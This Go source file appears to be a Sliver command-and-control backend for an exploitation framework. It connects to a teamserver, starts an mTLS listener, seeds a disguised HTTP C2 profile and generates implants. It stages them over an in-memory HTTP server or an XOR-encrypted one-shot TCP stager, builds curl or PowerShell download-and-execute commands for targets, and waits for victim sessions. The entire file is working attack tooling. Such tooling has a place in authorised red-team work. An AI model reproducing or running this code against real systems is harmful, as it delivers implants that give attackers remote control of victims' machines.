package sliver

import (
	"context"
	"encoding/binary"
	"fmt"
	"net"
	"net/http"
	"time"

	"github.com/bishopfox/sliver/protobuf/clientpb"
	"github.com/bishopfox/sliver/protobuf/commonpb"
	"github.com/bishopfox/sliver/protobuf/rpcpb"
	"google.golang.org/grpc"

	"github.com/Chocapikk/pik/pkg/c2"
	"github.com/Chocapikk/pik/pkg/output"
	"github.com/Chocapikk/pik/pkg/payload"
	"github.com/Chocapikk/pik/pkg/stager"
	"github.com/Chocapikk/pik/pkg/text"
)

func init() { c2.Register(New()) }

// Backend implements c2.Backend for Sliver C2 integration.
type Backend struct {
	client     rpcpb.SliverRPCClient
	conn       *grpc.ClientConn
	configPath string
	lhost      string
	lport      int
	listenerID uint32
	stageSrv   *http.Server
	tcpStageLn net.Listener
}

// New creates a Sliver backend.
func New() *Backend { return &Backend{} }

// Configure sets the operator config file path.
func (b *Backend) Configure(configPath string) { b.configPath = configPath }

func (b *Backend) Name() string { return "sliver" }

// Setup connects to the Sliver teamserver and starts an mTLS listener.
func (b *Backend) Setup(lhost string, lport int) error {
	b.lhost = lhost
	b.lport = lport

	cfg, err := ParseConfig(b.configPath)
	if err != nil {
		return err
	}

	client, conn, err := Connect(cfg)
	if err != nil {
		return err
	}
	b.client = client
	b.conn = conn

	ver, err := b.client.GetVersion(context.Background(), &commonpb.Empty{})
	if err != nil {
		return fmt.Errorf("sliver handshake: %w", err)
	}
	output.Success("Connected to Sliver v%d.%d.%d", ver.Major, ver.Minor, ver.Patch)

	err = b.ensureHTTPC2Config()
	if err != nil {
		return fmt.Errorf("httpc2 config: %w", err)
	}

	job, err := b.client.StartMTLSListener(context.Background(), &clientpb.MTLSListenerReq{
		Host: lhost,
		Port: uint32(lport),
	})
	if err != nil {
		return fmt.Errorf("start mTLS listener: %w", err)
	}
	b.listenerID = job.JobID
	output.Status("Sliver mTLS listener on %s:%d (job %d)", lhost, lport, job.JobID)

	return nil
}

// ensureHTTPC2Config seeds the Sliver DB with a default HTTPC2 config
// if none exists. Required by Generate even for mTLS-only implants.
func (b *Backend) ensureHTTPC2Config() error {
	configs, err := b.client.GetHTTPC2Profiles(context.Background(), &commonpb.Empty{})
	if err != nil {
		return err
	}
	if len(configs.Configs) > 0 {
		return nil
	}

	output.Status("Seeding default HTTPC2 config...")
	_, err = b.client.SaveHTTPC2Profile(context.Background(), &clientpb.HTTPC2ConfigReq{
		C2Config: defaultHTTPC2Config(),
	})
	return err
}

func defaultHTTPC2Config() *clientpb.HTTPC2Config {
	return &clientpb.HTTPC2Config{
		Name: "default",
		ServerConfig: &clientpb.HTTPC2ServerConfig{
			RandomVersionHeaders: false,
			Headers: []*clientpb.HTTPC2Header{
				{Method: "GET", Name: "Cache-Control", Value: "no-store, no-cache, must-revalidate"},
			},
			Cookies: []*clientpb.HTTPC2Cookie{
				{Name: "PHPSESSID"},
			},
		},
		ImplantConfig: &clientpb.HTTPC2ImplantConfig{
			MinFileGen:         2,
			MaxFileGen:         3,
			MinPathGen:         0,
			MaxPathGen:         2,
			MinPathLength:      2,
			MaxPathLength:      6,
			NonceQueryArgChars: "abcdefghijklmnopqrstuvwxyz",
			NonceQueryLength:   2,
			PathSegments: []*clientpb.HTTPC2PathSegment{
				{IsFile: false, Value: "app"},
				{IsFile: false, Value: "api"},
				{IsFile: true, Value: "index"},
				{IsFile: true, Value: "login"},
			},
			Extensions: []string{".html", ".php", ".jsp"},
		},
	}
}

// GenerateImplant generates a raw Sliver implant binary.
// Used by the runner for CmdStager delivery (chunked printf/bourne).
func (b *Backend) GenerateImplant(targetOS, arch string) ([]byte, error) {
	implantConfig := &clientpb.ImplantConfig{
		GOOS:             targetOS,
		GOARCH:           arch,
		IsBeacon:         false,
		Format:           clientpb.OutputFormat_EXECUTABLE,
		IncludeMTLS:      true,
		HTTPC2ConfigName: "default",
		C2: []*clientpb.ImplantC2{
			{Priority: 0, URL: fmt.Sprintf("mtls://%s:%d", b.lhost, b.lport)},
		},
	}

	output.Status("Generating implant for %s/%s...", targetOS, arch)
	gen, err := b.client.Generate(context.Background(), &clientpb.GenerateReq{
		Config: implantConfig,
		Name:   text.RandText(8),
	})
	if err != nil {
		return nil, fmt.Errorf("generate implant: %w", err)
	}
	output.Success("Implant ready - %s (%s)", output.Accent(gen.File.Name), output.Accent(output.HumanSize(len(gen.File.Data))))
	return gen.File.Data, nil
}

// GeneratePayload generates a Sliver implant, stages it, and returns a
// curl download-and-execute command. Use StageImplant + pkg/payload for
// finer control over the fetch method.
func (b *Backend) GeneratePayload(targetOS, arch string) (string, error) {
	url, err := b.StageImplant(targetOS, arch)
	if err != nil {
		return "", err
	}
	remotePath := fmt.Sprintf("/tmp/.%s", text.RandText(8))
	if targetOS == "windows" {
		return payload.PowerShellDownload(url, ""), nil
	}
	return payload.Curl(url, remotePath), nil
}

// StageImplant generates a Sliver implant, serves it over an in-memory
// HTTP server, and returns the staging URL.
func (b *Backend) StageImplant(targetOS, arch string) (string, error) {
	binary, err := b.GenerateImplant(targetOS, arch)
	if err != nil {
		return "", err
	}
	return b.stage(binary)
}

// stage serves a binary over an in-memory HTTP server and returns the URL.
func (b *Backend) stage(binary []byte) (string, error) {
	slugName := text.RandText(8)
	stagePort := b.lport + 1

	mux := http.NewServeMux()
	mux.HandleFunc("/"+slugName, func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/octet-stream")
		w.Write(binary) //nolint:errcheck
	})

	b.stageSrv = &http.Server{
		Addr:    fmt.Sprintf(":%d", stagePort),
		Handler: mux,
	}
	ln, err := net.Listen("tcp", b.stageSrv.Addr)
	if err != nil {
		return "", fmt.Errorf("stage listener: %w", err)
	}
	go func() { _ = b.stageSrv.Serve(ln) }()

	url := fmt.Sprintf("http://%s:%d/%s", b.lhost, stagePort, slugName)
	output.Status("Staging server on :%d (/%s)", stagePort, slugName)
	return url, nil
}

// TCPStageImplant generates a Sliver implant, starts a one-shot TCP staging
// server, and compiles a fresh stager binary with the host:port baked in.
// The payload stream is XOR-encrypted with a per-stager random key.
func (b *Backend) TCPStageImplant(targetOS, arch string) ([]byte, error) {
	implant, err := b.GenerateImplant(targetOS, arch)
	if err != nil {
		return nil, err
	}

	stagePort := b.lport + 2

	output.Status("Compiling TCP stager for %s/%s...", targetOS, arch)
	result, err := stager.Generate(targetOS, arch, b.lhost, uint16(stagePort))
	if err != nil {
		return nil, fmt.Errorf("tcp stager: %w", err)
	}

	if err := b.serveTCP(implant, stagePort, result.XORKey); err != nil {
		return nil, err
	}

	output.Success("TCP stager ready - %s (implant: %s)",
		output.Accent(output.HumanSize(len(result.Binary))),
		output.Accent(output.HumanSize(len(implant))))

	return result.Binary, nil
}

// serveTCP starts a one-shot TCP server that sends XOR-encrypted
// [4-byte LE size][payload] to the first connection, then closes.
func (b *Backend) serveTCP(implant []byte, port int, xorKey [4]byte) error {
	addr := fmt.Sprintf(":%d", port)
	ln, err := net.Listen("tcp", addr)
	if err != nil {
		return fmt.Errorf("tcp stage listener on %s: %w", addr, err)
	}
	b.tcpStageLn = ln
	output.Status("TCP staging server on :%d", port)

	go func() {
		defer ln.Close()
		conn, err := ln.Accept()
		if err != nil {
			return
		}
		defer conn.Close()

		// XOR-encrypt size and payload separately (key restarts at 0 for each)
		sizeBuf := make([]byte, 4)
		binary.LittleEndian.PutUint32(sizeBuf, uint32(len(implant)))
		stager.XOREncrypt(sizeBuf, xorKey)
		if _, err := conn.Write(sizeBuf); err != nil {
			return
		}
		payload := make([]byte, len(implant))
		copy(payload, implant)
		stager.XOREncrypt(payload, xorKey)
		if _, err := conn.Write(payload); err != nil {
			return
		}

		output.Success("TCP staging complete - sent %s to %s",
			output.Accent(output.HumanSize(len(implant))),
			conn.RemoteAddr())
	}()

	return nil
}

// WaitForSession subscribes to Sliver events and blocks until a new session connects.
func (b *Backend) WaitForSession(timeout time.Duration) error {
	ctx, cancel := context.WithTimeout(context.Background(), timeout)
	defer cancel()

	events, err := b.client.Events(ctx, &commonpb.Empty{})
	if err != nil {
		return fmt.Errorf("event stream: %w", err)
	}

	output.Status("Waiting for Sliver session...")
	for {
		event, err := events.Recv()
		if err != nil {
			return fmt.Errorf("event recv: %w", err)
		}
		if event.EventType == "session-connected" && event.Session != nil {
			sid := event.Session.ID
			if len(sid) > 8 {
				sid = sid[:8]
			}
			output.Success("Sliver session: %s (%s@%s)",
				sid, event.Session.Username, event.Session.Hostname)
			return nil
		}
	}
}

// Shutdown tears down staging servers, kills the Sliver listener, and closes the gRPC connection.
func (b *Backend) Shutdown() error {
	if b.stageSrv != nil {
		b.stageSrv.Close()
	}
	if b.tcpStageLn != nil {
		b.tcpStageLn.Close()
	}
	if b.client != nil && b.listenerID > 0 {
		_, _ = b.client.KillJob(context.Background(), &clientpb.KillJobReq{
			ID: b.listenerID,
		})
	}
	if b.conn != nil {
		return b.conn.Close()
	}
	return nil
}
